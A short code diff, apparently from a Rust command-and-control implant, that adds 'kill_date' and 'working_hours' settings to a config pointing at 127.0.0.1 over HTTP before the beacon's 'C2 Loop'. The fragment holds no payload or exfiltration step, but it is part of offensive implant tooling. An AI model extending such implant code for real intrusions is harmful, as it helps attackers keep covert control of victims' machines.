@@ -39,6 +39,8 @@ pub extern "C" fn _start() -> ! {
         transport: c2::TransportType::Http,
         server_addr: "127.0.0.1",
         sleep_interval: 5000,
+        kill_date: 0,
+        working_hours: (0, 0),
     };
 
     // 2. Enter C2 Loop
